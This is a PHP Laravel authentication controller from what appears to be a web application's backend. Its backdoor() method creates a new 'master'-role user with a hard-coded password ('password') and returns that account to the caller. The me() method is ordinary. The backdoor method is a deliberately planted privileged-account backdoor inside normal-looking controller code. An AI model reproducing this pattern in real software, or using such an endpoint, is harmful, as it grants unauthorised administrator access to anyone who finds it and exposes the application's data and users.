<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Repositories\UserRepository;
use App\Models\User;
use App\Traits\ApiResponse;

class MasterController extends Controller
{
    use ApiResponse;

    protected UserRepository $userRepository;

    public function __construct()
    {
        $this->userRepository = new UserRepository;
    }

    public function backdoor()
    {
        $faker = \Faker\Factory::create();
        $user = User::create([
            'name' => $faker->name,
            'email' => $faker->email,
            'password' => bcrypt('password'),
            'auth' => 'master',
            'office_id' => 1,
            'Invitation_link' => 'backdoor',
        ]);
        return $this->okResponse($user);
    }

    public function me()
    {
        $userInfo = $this->userRepository->getUserInfo('master');
        return $this->successResponse($userInfo);
    }

}
